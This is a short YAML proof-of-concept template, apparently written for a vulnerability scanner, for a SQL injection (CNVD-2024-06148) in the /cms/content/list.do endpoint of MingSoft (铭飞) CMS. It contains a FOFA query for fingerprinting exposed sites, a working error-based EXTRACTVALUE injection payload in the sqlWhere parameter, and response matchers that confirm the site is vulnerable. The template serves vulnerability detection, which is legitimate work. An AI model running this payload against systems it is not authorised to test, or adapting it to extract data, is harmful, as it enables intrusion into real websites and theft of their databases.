id: poc-yaml-mingsoft-cms-list-do-sqli-cnvd-2024-06148
info:
  name: 铭飞CMS list.do SQL注入漏洞(CNVD-2024-06148)
  severity: high
  tags:
  - CNVD-2024-06148
  - SQL注入
  finger: 铭飞CMS
  fofa: body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /cms/content/list.do
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x7e,(select
    md5({{.t1}})),0x7e))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]
  expression: status_code == 500 && contains(body,"XPATH syntax error") && contains(body,substr(t2,0,31))
    && contains(body,"java.sql.SQLException")
transport: http
